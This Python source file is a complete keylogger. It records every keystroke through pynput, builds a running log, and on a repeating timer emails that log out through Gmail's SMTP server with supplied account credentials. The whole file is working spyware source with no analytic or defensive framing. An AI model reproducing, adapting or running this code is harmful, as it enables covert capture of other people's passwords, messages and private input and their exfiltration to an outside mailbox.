#! /bin/env python
import pynput.keyboard
import threading
import smtplib

class Keylogger:
	def __init__(self, time_interval, email, password):
		self.log = "Keylogger Started"
		self.interval = time_interval
		self.email = email
		self.password = password
		
	def process_key_press(self, key):
		try:
			self.log += str(key.char)
		except AttributeError:
			if key == key.space:
				self.log += " "
			else:
				str_key = str(key)
				str_key = str_key.replace("Key.", "$") #to show it is a special key
				self.log += str_key + '$'
				
	def send_mail(self, email, password, message):
		server = smtplib.SMTP("smtp.gmail.com", 587)
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, message)
		server.quit()

	def report(self):
		self.send_mail(self.email, self.password, "\n\n" + self.log)
		self.log = ""
		timer = threading.Timer(self.interval, self.report)
		timer.start()
		
	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
		with keyboard_listener:
			self.report() 
			keyboard_listener.join()
		
